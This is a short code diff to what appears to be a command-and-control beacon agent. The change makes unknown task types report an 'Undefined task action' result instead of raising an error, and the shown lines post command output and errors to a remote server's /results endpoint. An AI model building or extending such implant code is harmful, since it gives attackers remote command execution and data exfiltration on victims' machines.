@@ -47,7 +47,7 @@ class Beacon:
                     print("Sending result back to server:",data)
                 req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
             else:
-                raise ValueError("Invalid task type")
+                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': "Undefined task action",'returncode': 9999}
         except subprocess.CalledProcessError as e:
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                 req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
